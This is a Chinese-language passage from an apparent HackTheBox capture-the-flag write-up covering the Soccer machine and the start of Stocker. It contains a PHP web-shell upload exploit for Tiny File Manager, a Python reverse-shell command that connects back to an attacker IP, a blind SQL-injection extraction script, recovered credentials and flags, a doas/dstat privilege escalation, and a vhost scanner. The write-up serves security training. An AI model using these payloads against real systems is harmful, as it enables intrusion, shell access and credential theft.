<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://tinyfilemanager.github.io/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span> <span class="attr">data-version</span>=<span class="string">&quot;2.4.3&quot;</span>&gt;</span>CCP Programmers<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>即版本为2.4.3</p>
<p>相关EXP</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/tiny_file_manager_exploit.py">https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/tiny_file_manager_exploit.py</a></p>
</blockquote>
<p>适当修改脚本后运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">datas&#x3D;&#123;&quot;p&quot;:&quot;tiny&#x2F;uploads&quot;, &quot;fullpath&quot;:&quot;&#x2F;BFL&#x2F;BFL.php&quot;&#125;</span><br><span class="line">files&#x3D;&#123;&quot;file&quot;:(&quot;exp.php&quot;,&quot;&lt;?php system($_REQUEST[&#39;BFL&#39;]); ?&gt;&quot;,&quot;application&#x2F;x-php&quot;)&#125;</span><br></pre></td></tr></table></figure>
<p>监听端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure>
<p>反弹Shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://soccer.htb/tiny/uploads/BFL/BFL.php?BFL=python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2710.10.16.30%27%2C9998%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27/bin/bash%27%2C%27-i%27%5D%29%3B%22&#x27;</span></span><br></pre></td></tr></table></figure>
<p>获取TTY</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>查看WEB站点配置信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/nginx/sites-enabled/default.htb</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	listen 80;</span><br><span class="line">	listen [::]:80;</span><br><span class="line">	server_name 0.0.0.0;</span><br><span class="line">	return 301 http:&#x2F;&#x2F;soccer.htb$request_uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">	listen 80;</span><br><span class="line">	listen [::]:80;</span><br><span class="line"></span><br><span class="line">	server_name soccer.htb;</span><br><span class="line"></span><br><span class="line">	root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">	index index.html tinyfilemanager.php;</span><br><span class="line">		</span><br><span class="line">	location &#x2F; &#123;</span><br><span class="line">				try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	location ~ \.php$ &#123;</span><br><span class="line">		include snippets&#x2F;fastcgi-php.conf;</span><br><span class="line">		fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.4-fpm.sock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	location ~ &#x2F;\.ht &#123;</span><br><span class="line">		deny all;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/nginx/sites-enabled/soc-player.htb</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	listen 80;</span><br><span class="line">	listen [::]:80;</span><br><span class="line"></span><br><span class="line">	server_name soc-player.soccer.htb;</span><br><span class="line"></span><br><span class="line">	root &#x2F;root&#x2F;app&#x2F;views;</span><br><span class="line"></span><br><span class="line">	location &#x2F; &#123;</span><br><span class="line">		proxy_pass http:&#x2F;&#x2F;localhost:3000;</span><br><span class="line">		proxy_http_version 1.1;</span><br><span class="line">		proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">		proxy_set_header Connection &#39;upgrade&#39;;</span><br><span class="line">		proxy_set_header Host $host;</span><br><span class="line">		proxy_cache_bypass $http_upgrade;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到新域名<code>soc-player.soccer.htb</code></p>
<p>添加域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.194\tsoc-player.soccer.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<p>访问域名<code>soc-player.soccer.htb</code></p>
<p>进行注册，登录</p>
<p>源代码中存在以下js脚本</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>);</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;connected to the server&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">input.addEventListener(<span class="string">&#x27;keypress&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">	keyOne(e)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">keyOne</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">	e.stopPropagation();</span><br><span class="line">	<span class="keyword">if</span> (e.keyCode === <span class="number">13</span>) &#123;</span><br><span class="line">e.preventDefault();</span><br><span class="line">sendText();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendText</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> msg = input.value;</span><br><span class="line">	<span class="keyword">if</span> (msg.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">ws.send(<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">	<span class="string">&quot;id&quot;</span>: msg</span><br><span class="line">&#125;))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> append(<span class="string">&quot;????????&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">append(e.data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="comment">// let randomColor = &#x27;#&#x27; + Math.floor(Math.random() * 16777215).toString(16);</span></span><br><span class="line"><span class="comment">// p.style.color = randomColor;</span></span><br><span class="line">p.textContent = msg</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本地console进行测试</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>);</span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;<span class="built_in">console</span>.log(e.data)&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws.send(JSON.stringify(&#123;&quot;id&quot;: &quot;0&quot;&#125;));</span><br><span class="line">Ticket Doesn&#39;t Exist</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws.send(JSON.stringify(&#123;&quot;id&quot;: &quot;0 or 1&quot;&#125;));</span><br><span class="line">Ticket Exists</span><br></pre></td></tr></table></figure>
<p>存在SQL注入漏洞</p>
<p>二分法布尔注入</p>
<blockquote>
<p>pip install websocket-client</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">ws, message</span>):</span></span><br><span class="line">	<span class="keyword">global</span> result</span><br><span class="line">	result = message  <span class="comment"># handle the received message here</span></span><br><span class="line">	ws.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_error</span>(<span class="params">ws, error</span>):</span></span><br><span class="line">	print(error)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_close</span>(<span class="params">ws</span>):</span></span><br><span class="line">	print(<span class="string">&quot;Closed connection&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_open</span>(<span class="params">ws</span>):</span></span><br><span class="line">	<span class="keyword">global</span> send_data</span><br><span class="line">	ws.send(json.dumps(send_data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">	websocket.enableTrace(<span class="literal">False</span>)  <span class="comment"># enable trace for debugging purposes</span></span><br><span class="line">	ws = websocket.WebSocketApp(<span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>,</span><br><span class="line">								on_message=on_message,</span><br><span class="line">								on_error=on_error,</span><br><span class="line">								on_close=on_close)</span><br><span class="line">	ws.on_open = on_open</span><br><span class="line">	ws.run_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">version</span>():</span></span><br><span class="line">	pos = <span class="number">1</span></span><br><span class="line">	response = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		bot = <span class="number">0</span></span><br><span class="line">		top = <span class="number">128</span></span><br><span class="line">		mid = (bot + top) // <span class="number">2</span></span><br><span class="line">		<span class="keyword">while</span>(bot &lt; top):</span><br><span class="line">			<span class="keyword">global</span> send_data</span><br><span class="line">			send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr(@@version,%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br><span class="line">			print(send_data)</span><br><span class="line">			run()</span><br><span class="line">			<span class="keyword">if</span> result == <span class="string">&quot;Ticket Exists&quot;</span>:</span><br><span class="line">				bot = mid + <span class="number">1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				top = mid</span><br><span class="line">			mid = (bot + top) // <span class="number">2</span></span><br><span class="line">			<span class="keyword">if</span>(mid == <span class="number">0</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		pos += <span class="number">1</span></span><br><span class="line">		response = response + <span class="built_in">chr</span>(mid)</span><br><span class="line">		print(response)</span><br><span class="line">		<span class="keyword">if</span> mid == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">version()</span><br></pre></td></tr></table></figure>
<p>得到版本信息如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.0.31-0ubuntu0.20.04.2</span><br></pre></td></tr></table></figure>
<p>查询用户信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr((select user()),%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br></pre></td></tr></table></figure>
<p>用户信息如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">player@localhost</span><br></pre></td></tr></table></figure>
<p>查询库名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br></pre></td></tr></table></figure>
<p>库名如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql,information_schema,performance_scqema,sys,soccer_db</span><br></pre></td></tr></table></figure>
<p>查询user表</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr((select group_concat(user, &#x27;:&#x27; ,password) from mysql.user),%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br></pre></td></tr></table></figure>
<p>user表如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debian-sys-maint:PlayerOftheMatch2022,mysql.infoschema:PlayerOftheMatch2022,mysql.session:PlayerOftheMatch2022,mysql.sys:PlayerOftheMatch2022,player:PlayerOftheMatch2022,root:PlayerOftheMatch2022</span><br></pre></td></tr></table></figure>
<p>SSH登入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh player@10.10.11.194</span><br><span class="line">PlayerOftheMatch2022</span><br></pre></td></tr></table></figure>
<p>查看user.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;player&#x2F;user.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">71661caf8fd27d4777ef94f5ae4cfea5</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-21"><a class="markdownIt-Anchor" href="#权限提升-21"></a> 权限提升</h2>
<p>查询SUID文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;doas</span><br></pre></td></tr></table></figure>
<p>查看doas配置信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/<span class="built_in">local</span>/etc/doas.conf </span><br><span class="line">permit nopass player as root cmd /usr/bin/dstat</span><br></pre></td></tr></table></figure>
<p><code>/usr/local/bin/doas</code>, <code>/usr/local/bin/vidoas</code><br />
这两个程序都能给出配置信息的路径，前者需要IDA简略分析，后者运行即可得知</p>
<blockquote>
<p>There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf – <a target="_blank" rel="noopener" href="https://0x1.gitlab.io/exploit/Linux-Privilege-Escalation/">https://0x1.gitlab.io/exploit/Linux-Privilege-Escalation/</a></p>
</blockquote>
<p>意思就是把这个doas当成sudo来处理</p>
<p>添加dstat配置文件并调用即可提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;import os; os.execv(&quot;/bin/sh&quot;, [&quot;sh&quot;])&#x27;</span> &gt; /usr/<span class="built_in">local</span>/share/dstat/dstat_BFL.py</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/doas -u root /usr/bin/dstat --BFL</span><br></pre></td></tr></table></figure>
<p>查看root.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53d6af62fd48af558d4bd82282e5c668</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>错误方法，正确答案</p>
</blockquote>
<p>当时查出来的user表看着很怪，但是还是能登入player账户（获取WebShell之后可以看<code>/etc/passwd</code>或者<code>/home/</code>得知player用户的存在），就没去看soccer_db了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select user, password from mysql.user;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#39;password&#39; in &#39;field list&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /root/app/server.js</span><br><span class="line">...</span><br><span class="line">const query = `Select id,username,password  FROM accounts <span class="built_in">where</span> id = <span class="variable">$&#123;id&#125;</span>`;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from soccer_db.accounts;</span><br><span class="line">+------+-------------------+----------+----------------------+</span><br><span class="line">| id   | email             | username | password             |</span><br><span class="line">+------+-------------------+----------+----------------------+</span><br><span class="line">| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |</span><br><span class="line">+------+-------------------+----------+----------------------+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select user from mysql.user;</span><br><span class="line">+------------------+</span><br><span class="line">| user             |</span><br><span class="line">+------------------+</span><br><span class="line">| debian-sys-maint |</span><br><span class="line">| mysql.infoschema |</span><br><span class="line">| mysql.session    |</span><br><span class="line">| mysql.sys        |</span><br><span class="line">| player           |</span><br><span class="line">| root             |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
<hr />
<h1 id="hackthebox_stocker"><a class="markdownIt-Anchor" href="#hackthebox_stocker"></a> HackTheBox_Stocker</h1>
<h2 id="信息收集-6"><a class="markdownIt-Anchor" href="#信息收集-6"></a> 信息收集</h2>
<h3 id="端口扫描-23"><a class="markdownIt-Anchor" href="#端口扫描-23"></a> 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.196</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.196</span><br><span class="line">Host is up (1.7s latency).</span><br><span class="line">Not shown: 528 closed ports, 470 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h3 id="路径枚举-4"><a class="markdownIt-Anchor" href="#路径枚举-4"></a> 路径枚举</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://10.10.11.196/</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Tue, 07 Mar 2023 11:42:59 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 178</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;stocker.htb</span><br></pre></td></tr></table></figure>
<p>跳转至域名<code>stocker.htb</code></p>
<p>添加域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.196\tstocker.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<p>枚举路径未得到有效信息</p>
<h3 id="vhost"><a class="markdownIt-Anchor" href="#vhost"></a> VHOST</h3>
<p>生成VHOST列表</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vhost.py</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt&quot;</span>)</span><br><span class="line">data = file.read().split()</span><br><span class="line">file.close()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> data:</span><br><span class="line">	print(<span class="string">&quot;10.10.11.196\t%s.stocker.htb&quot;</span> % _)</span><br></pre></td></tr></table></figure>
<p>备份hosts文件并生成新hosts文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/hosts /etc/hosts.bak</span><br><span class="line">python vhost.py &gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<p>VHOST扫描程序如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># scan.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/etc/hosts&quot;</span>)</span><br><span class="line">data_list = file.read().replace(<span class="string">&quot;10.10.11.196\t&quot;</span>, <span class="string">&quot;&quot;</span>).split()</span><br><span class="line">file.close()</span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> index</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enum</span>():</span></span><br><span class="line">	<span class="keyword">global</span> index</span><br><span class="line">	<span class="keyword">while</span> index &lt; <span class="built_in">len</span>(data_list):</span><br><span class="line">		tmp_vhost = data_list[index]</span><br><span class="line">		index += <span class="number">1</span></span><br><span class="line">		print(index)</span><br><span class="line">		res = req.get(<span class="string">&quot;http://%s/&quot;</span> % tmp_vhost, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;Location&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers <span class="keyword">or</span> res.headers[<span class="string">&quot;Location&quot;</span>] != <span class="string">&quot;http://stocker.htb&quot;</span>:</span><br><span class="line">			print(tmp_vhost)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	t = threading.Thread(target=enum)</span><br><span class="line">	threads.append(t)</span><br><span class="line">	t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">	t.join()</span><br></pre></td></tr></table></figure>
<p>扫描得到VHOST信息如下</p>
